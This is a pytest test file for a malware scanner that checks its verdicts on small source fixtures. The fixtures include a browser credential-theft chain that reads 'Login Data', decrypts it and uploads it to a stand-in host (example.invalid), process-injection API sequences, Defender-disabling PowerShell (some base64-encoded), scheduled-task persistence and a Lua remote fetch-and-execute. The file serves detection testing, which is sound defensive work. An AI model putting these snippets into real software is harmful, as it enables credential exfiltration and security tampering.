"""Independent delivery QA with harmless source bytes, never executed fixtures.

The default Scanner exercises real isolated YARA workers. These cases distinguish
visible active relationships from comments, declarations and data, and ensure
that incomplete static views cannot silently grant a clean verdict.
"""

from __future__ import annotations

import base64
from dataclasses import replace

import pytest

from malguard_core.api.scanner import Scanner
from malguard_core.model import CoverageState, EvidenceDomain, Verdict
from malguard_core.settings import ScanSettings


@pytest.fixture(scope="module")
def scanner():
    with Scanner() as instance:
        yield instance


def scan_source(scanner, tmp_path, source, suffix=".cs"):
    path = tmp_path / ("harmless-fixture" + suffix)
    path.write_bytes(source.encode("utf-8"))
    return scanner.scan_file(path)


def harm(report):
    return tuple(item for item in report.evidence if item.domain is EvidenceDomain.HARM)


@pytest.mark.parametrize("suffix,source", [
    (".cs", "interface Native { void OpenProcess(); void WriteProcessMemory(); }"),
    (".cs", "interface Native { void OpenProcess(); void VirtualAllocEx(); "
     "void WriteProcessMemory(); void CreateRemoteThread(); }"),
    (".cs", "class Native { static extern int OpenProcess(int x); "
     "static extern int VirtualAllocEx(int h); static extern int WriteProcessMemory(int h); "
     "static extern int CreateRemoteThread(int h); }"),
    (".cs", 'using System.Runtime.InteropServices; class Native { '
     '[DllImport("kernel32.dll")] public static extern int OpenProcess(int h); '
     '[DllImport("kernel32.dll")] public static extern int VirtualAllocEx(int h); '
     '[DllImport("kernel32.dll")] public static extern int WriteProcessMemory(int h); '
     '[DllImport("kernel32.dll")] public static extern int CreateRemoteThread(int h); }'),
    (".cs", 'class Documentation { const string Example="Login Data password_value"; '
     'static void CryptUnprotectData() {} static void UploadData() {} }'),
    (".cs", 'class Documentation { const string Example="Login Data CryptUnprotectData '
     'password_value UploadData"; void Invoke() {} }'),
    (".cs", 'class Documentation { string Example=$"Login Data CryptUnprotectData '
     'password_value UploadData"; }'),
    (".vb", "REM Login Data CryptUnprotectData password_value UploadData\n"),
    (".vbs", "Rem Login Data CryptUnprotectData password_value UploadData\n"),
    (".ini", "; Login Data CryptUnprotectData password_value UploadData\n[Fixture]\n"),
    (".xml", "<!-- Login Data CryptUnprotectData password_value UploadData --><settings/>"),
    (".cmd", "@echo off\necho schtasks /create /tn Fixture\n"
     "echo Set-MpPreference -DisableRealtimeMonitoring $true\n"),
    (".bat", "@echo off\necho schtasks /create /tn Fixture\n"
     "echo Set-MpPreference -DisableRealtimeMonitoring $true\n"),
])
def test_proven_inert_source_never_receives_harm(scanner, tmp_path, suffix, source):
    report = scan_source(scanner, tmp_path, source, suffix)
    assert not harm(report), [(item.rule_id, item.family) for item in harm(report)]
    assert report.verdict is Verdict.SAFE


def test_batch_echo_does_not_hide_a_following_active_command(scanner, tmp_path):
    report = scan_source(scanner, tmp_path,
                         "echo harmless & schtasks /create /tn Fixture /tr harmless\n", ".cmd")
    assert any(item.family == "PERSISTENCE" for item in harm(report))
    assert report.verdict is not Verdict.SAFE


def test_csharp_control_condition_is_not_a_method_declaration(scanner, tmp_path):
    source = ('if (OpenProcess(access,false,unknownPid) != IntPtr.Zero) { '
              'VirtualAllocEx(handle,0,1,0,0); WriteProcessMemory(handle,address,bytes); '
              'CreateRemoteThread(handle,0,0,address,0,0,0); }')
    report = scan_source(scanner, tmp_path, source)
    assert any(item.family == "PROCESS_INJECTION" for item in harm(report))
    assert report.verdict is not Verdict.SAFE


@pytest.mark.parametrize("suffix,source", [
    (".cmd", "\nREM harmless\n"),
    (".bat", "echo harmless\n\nREM harmless\n"),
    (".cmd", "\r\nREM harmless\r\n"),
    (".vb", "\nREM harmless\n"),
    (".vbs", "\nREM harmless\n"),
    (".ini", "\n; harmless\n[Fixture]\n"),
    (".cfg", "\n# harmless\n"),
])
def test_blank_line_before_comment_makes_bounded_forward_progress(
        tmp_path, suffix, source):
    settings = replace(ScanSettings(), budget_limits={"parser_iterations": 1000})
    with Scanner(settings) as scanner:
        report = scan_source(scanner, tmp_path, source, suffix)
    assert report.verdict is Verdict.SAFE
    assert all(entry.state is CoverageState.COMPLETE for entry in report.root_artifact.coverage)


@pytest.mark.parametrize("source", [
    'Write-Output "GTA5 $(Set-MpPreference -DisableRealtimeMonitoring $true)"\n',
    '@"\nGTA5 $(Set-MpPreference -DisableRealtimeMonitoring $true)\n"@\n',
])
def test_powershell_executable_string_subexpression_cannot_be_inert(scanner, tmp_path, source):
    report = scan_source(scanner, tmp_path, source, ".ps1")
    assert report.verdict is not Verdict.SAFE
    assert any(item.family == "SECURITY_TAMPERING" for item in harm(report))


@pytest.mark.parametrize("source", [
    'Write-Output \'GTA5 $(Set-MpPreference -DisableRealtimeMonitoring $true)\'\n',
    "@'\nGTA5 $(Set-MpPreference -DisableRealtimeMonitoring $true)\n'@\n",
])
def test_powershell_single_quoted_data_stays_inert(scanner, tmp_path, source):
    report = scan_source(scanner, tmp_path, source, ".ps1")
    assert not harm(report)
    assert report.verdict is Verdict.SAFE


@pytest.mark.parametrize("mutation", [
    "Array.Fill(targets, Process.GetProcessById(unknownPid));",
    "ChangeTarget(targets);",
])
def test_mutable_process_array_escape_cannot_prove_gta_exclusivity(
        scanner, tmp_path, mutation):
    source = ('var targets=Process.GetProcessesByName("GTA5");\n' + mutation + '\n'
              'var handle=OpenProcess(0x28,false,targets[0].Id);\n'
              'WriteProcessMemory(handle,address,bytes,bytes.Length,out written);\n'
              'void ChangeTarget(Process[] p) { p[0]=Process.GetProcessById(unknownPid); }')
    report = scan_source(scanner, tmp_path, source)
    assert "HACKTOOL_PUA" not in report.classification_tags
    assert any(item.family == "PROCESS_INJECTION" for item in harm(report))
    assert report.verdict is not Verdict.SAFE


@pytest.mark.parametrize("source", [
    'local body=http.get("https://example.invalid/version")\n'
    'body="return 42"\nloadstring(body)',
    'local body=http.get("https://example.invalid/version")\n'
    'local Body="return 42"\nloadstring(Body)',
    'function first() local body=http.get("https://example.invalid/version") end\n'
    'function second() local body="return 42"; loadstring(body) end',
])
def test_unrelated_lua_binding_is_not_a_proven_remote_execution_chain(
        scanner, tmp_path, source):
    report = scan_source(scanner, tmp_path, source, ".lua")
    assert not any(item.rule_id == "scripts.remote_fetch_execute" for item in harm(report))
    assert report.verdict is not Verdict.MALICIOUS


@pytest.mark.parametrize("source", [
    'var raw=File.ReadAllBytes("Login Data"); raw=File.ReadAllBytes("settings.enc"); '
    'var clear=ProtectedData.Unprotect(raw,null,scope); '
    'client.UploadData("https://example.invalid/config",clear);',
    'var raw=File.ReadAllBytes("Login Data"); var Raw=File.ReadAllBytes("settings.enc"); '
    'var clear=ProtectedData.Unprotect(Raw,null,scope); '
    'client.UploadData("https://example.invalid/config",clear);',
    'void First(){var raw=File.ReadAllBytes("Login Data");} '
    'void Second(){var raw=File.ReadAllBytes("settings.enc"); '
    'var clear=ProtectedData.Unprotect(raw,null,scope); '
    'client.UploadData("https://example.invalid/config",clear);}',
])
def test_unrelated_credential_binding_cannot_manufacture_malicious_verdict(
        scanner, tmp_path, source):
    report = scan_source(scanner, tmp_path, source)
    assert not harm(report), [(item.rule_id, item.family) for item in harm(report)]
    assert report.verdict is not Verdict.MALICIOUS


def test_overwritten_cleartext_is_not_proven_credential_exfiltration(scanner, tmp_path):
    source = ('var raw=File.ReadAllBytes("Login Data"); '
              'var clear=ProtectedData.Unprotect(raw,null,scope); '
              'clear=File.ReadAllBytes("version.dat"); '
              'client.UploadData("https://example.invalid/version",clear);')
    report = scan_source(scanner, tmp_path, source)
    assert any(item.family == "CREDENTIAL_ACCESS" for item in harm(report))
    assert not any(item.family == "EXFILTRATION" for item in harm(report))
    assert report.verdict is not Verdict.MALICIOUS


@pytest.mark.parametrize("receiver", ["client", "uploader"])
def test_direct_nested_credential_chain_is_visible_to_source_analysis(
        scanner, tmp_path, receiver):
    source = (receiver + '.UploadData("https://example.invalid/upload", '
              'ProtectedData.Unprotect(File.ReadAllBytes("Login Data"),null,scope));')
    report = scan_source(scanner, tmp_path, source)
    assert {"CREDENTIAL_ACCESS", "EXFILTRATION"}.issubset({item.family for item in harm(report)})
    assert report.verdict is Verdict.MALICIOUS


def test_arbitrary_receiver_preserves_explicit_credential_transfer(scanner, tmp_path):
    source = ('var raw=File.ReadAllBytes("Login Data"); '
              'var clear=ProtectedData.Unprotect(raw,null,scope); '
              'uploader.UploadData("https://example.invalid/upload",clear);')
    report = scan_source(scanner, tmp_path, source)
    assert {"CREDENTIAL_ACCESS", "EXFILTRATION"}.issubset({item.family for item in harm(report)})
    assert report.verdict is Verdict.MALICIOUS


def test_unrelated_csharp_block_cannot_erase_existing_credential_lineage(scanner, tmp_path):
    source = ('var raw=File.ReadAllBytes("Login Data"); '
              'if(enabled){Print("harmless");} '
              'var clear=ProtectedData.Unprotect(raw,null,scope); '
              'client.UploadData("https://example.invalid/upload",clear);')
    report = scan_source(scanner, tmp_path, source)
    assert {"CREDENTIAL_ACCESS", "EXFILTRATION"}.issubset({item.family for item in harm(report)})
    assert report.verdict is Verdict.MALICIOUS


def test_unrelated_decoded_data_is_not_promoted_to_executable_source(scanner, tmp_path):
    documentation = ('var raw=File.ReadAllBytes("Login Data"); '
                     'var clear=ProtectedData.Unprotect(raw,null,scope); '
                     'client.UploadData("https://example.invalid/upload",clear);')
    encoded = base64.b64encode(documentation.encode("ascii")).decode("ascii")
    source = 'local documentation="' + encoded + '"\nloadstring("return 0")()'
    report = scan_source(scanner, tmp_path, source, ".lua")
    assert not harm(report), [(item.rule_id, dict(item.attributes)) for item in harm(report)]
    assert report.verdict is not Verdict.MALICIOUS


@pytest.mark.parametrize("settings", [
    replace(ScanSettings(), enable_yara=False),
    replace(ScanSettings(), isolate_parsers=False),
])
def test_required_raw_stage_disabled_cannot_receive_safe(tmp_path, settings):
    with Scanner(settings) as scanner:
        report = scan_source(scanner, tmp_path, 'print("harmless")', ".lua")
    assert report.verdict is Verdict.INCONCLUSIVE
    assert any(entry.stage == "S7" and entry.state is CoverageState.BLOCKED
               for entry in report.root_artifact.coverage)


def test_malformed_source_cannot_receive_safe(scanner, tmp_path):
    report = scan_source(scanner, tmp_path, 'local message="harmless', ".lua")
    assert report.verdict is not Verdict.SAFE
    assert any(entry.stage == "S5" and entry.state is CoverageState.PARTIAL
               for entry in report.root_artifact.coverage)


def test_source_harm_survives_later_incomplete_comment(scanner, tmp_path):
    source = ('var raw=File.ReadAllBytes("Login Data"); '
              'var clear=ProtectedData.Unprotect(raw,null,scope); '
              'client.UploadData("https://example.invalid/upload",clear); /*')
    report = scan_source(scanner, tmp_path, source)
    assert report.verdict is Verdict.MALICIOUS
    assert {"CREDENTIAL_ACCESS", "EXFILTRATION"}.issubset({item.family for item in harm(report)})
    assert any(entry.stage == "S5" and entry.state is CoverageState.PARTIAL
               for entry in report.root_artifact.coverage)


@pytest.mark.parametrize("template", [
    "Authorization: Bearer {}",
    '{{"token":"{}"}}',
    '{{"password": "{}"}}',
    'api_key = "{}"',
    "https://discord.com/api/webhooks/123/{}",
    "https://example.invalid/?token={}",
])
def test_standard_secrets_are_redacted_from_both_report_formats(scanner, tmp_path, template):
    secret = "SYNTHETICQA0123456789TOKEN"
    report = scan_source(scanner, tmp_path, "return 0", ".lua")
    # A logical path can originate from a nested member or an intake failure.
    # Add formats through the immutable model to remain portable on Windows.
    artifacts = tuple(replace(item, logical_path=item.logical_path + " [" + template.format(secret) + "]")
                      for item in report.artifacts)
    report = replace(report, artifacts=artifacts)
    assert secret not in report.to_json()
    assert secret not in report.to_text()
    assert "[REDACTED]" in report.to_json()
    assert "[REDACTED]" in report.to_text()


def test_outer_gta_proof_cannot_suppress_an_unproven_decoded_memory_target(scanner, tmp_path):
    body = 'local other=OpenProcess(1,false,unknownPid); WriteProcessMemory(other,address,bytes);'
    encoded = base64.b64encode(body.encode("ascii")).decode("ascii")
    source = ('local targets=Process.GetProcessesByName("GTA5"); '
              'local h=OpenProcess(1,false,targets[0].Id); WriteProcessMemory(h,address,bytes); '
              'loadstring(base64.decode("' + encoded + '"))()')
    report = scan_source(scanner, tmp_path, source, ".lua")
    assert any(item.family == "PROCESS_INJECTION" and dict(item.attributes).get("decoded")
               for item in harm(report))
    assert "HACKTOOL_PUA" not in report.classification_tags
    assert report.verdict is not Verdict.SAFE


def test_decoded_gta_only_memory_target_retains_its_proven_context(scanner, tmp_path):
    body = ('local targets=Process.GetProcessesByName("GTA5"); '
            'local h=OpenProcess(1,false,targets[0].Id); WriteProcessMemory(h,address,bytes);')
    encoded = base64.b64encode(body.encode("ascii")).decode("ascii")
    report = scan_source(scanner, tmp_path,
                         'loadstring(base64.decode("' + encoded + '"))()', ".lua")
    assert not harm(report)
    assert "HACKTOOL_PUA" in report.classification_tags
    assert report.verdict is Verdict.SAFE


def test_vb_interpolated_expressions_cannot_be_downgraded_to_data(scanner, tmp_path):
    source = ('Dim message = $"Login Data password_value '
              '{ProtectedData.Unprotect(raw, Nothing, DataProtectionScope.CurrentUser)} '
              '{client.UploadData(url, raw)}"')
    report = scan_source(scanner, tmp_path, source, ".vb")
    assert report.verdict is not Verdict.SAFE
    assert any(item.domain is EvidenceDomain.HARM for item in report.evidence)
    assert any(entry.stage == "S5" and entry.state is CoverageState.PARTIAL
               for entry in report.root_artifact.coverage)


def test_vb_interpolated_plain_text_stays_inert(scanner, tmp_path):
    source = 'Dim message = $"Login Data CryptUnprotectData password_value UploadData"'
    report = scan_source(scanner, tmp_path, source, ".vb")
    assert not harm(report)
    assert report.verdict is Verdict.SAFE


@pytest.mark.parametrize("sensitive_text", [
    'password="QAPASSPREFIX QA0123456789TOKEN"',
    '{"password":"QAPASSPREFIX \\"QA0123456789TOKEN\\" tail"}',
    "secret='QAPASSPREFIX \\'QA0123456789TOKEN\\' tail'",
])
def test_full_quoted_passphrase_and_escaped_quotes_are_redacted(
        scanner, tmp_path, sensitive_text):
    report = scan_source(scanner, tmp_path, "return 0", ".lua")
    report = replace(report, artifacts=tuple(
        replace(item, logical_path=item.logical_path + " [" + sensitive_text + "]")
        for item in report.artifacts))
    for rendered in (report.to_json(), report.to_text()):
        assert "QAPASSPREFIX" not in rendered
        assert "QA0123456789TOKEN" not in rendered
        assert "[REDACTED]" in rendered


def test_a_benign_encoded_command_cannot_hide_a_later_active_one(scanner, tmp_path):
    benign = base64.b64encode("Write-Output harmless".encode("utf-16-le")).decode("ascii")
    active = base64.b64encode(
        "Set-MpPreference -DisableRealtimeMonitoring $true".encode("utf-16-le")).decode("ascii")
    source = ("powershell.exe -EncodedCommand " + benign + "\n"
              "powershell.exe -EncodedCommand " + active + "\n")
    report = scan_source(scanner, tmp_path, source, ".cmd")
    assert any(item.family == "SECURITY_TAMPERING" for item in harm(report))
    assert report.verdict is not Verdict.SAFE


def test_plaintext_interpreter_argument_cannot_receive_a_clean_verdict(scanner, tmp_path):
    body = 'local response=http.get("https://example.invalid/inert"); loadstring(response)()'
    report = scan_source(scanner, tmp_path, "loadstring('" + body + "')()", ".lua")
    assert report.verdict is not Verdict.SAFE


def test_unrelated_plaintext_documentation_does_not_feed_constant_interpreter(scanner, tmp_path):
    source = ('local documentation="Login Data CryptUnprotectData password_value UploadData"; '
              'loadstring("return 0")()')
    report = scan_source(scanner, tmp_path, source, ".lua")
    assert not harm(report)
    assert report.verdict is Verdict.SAFE
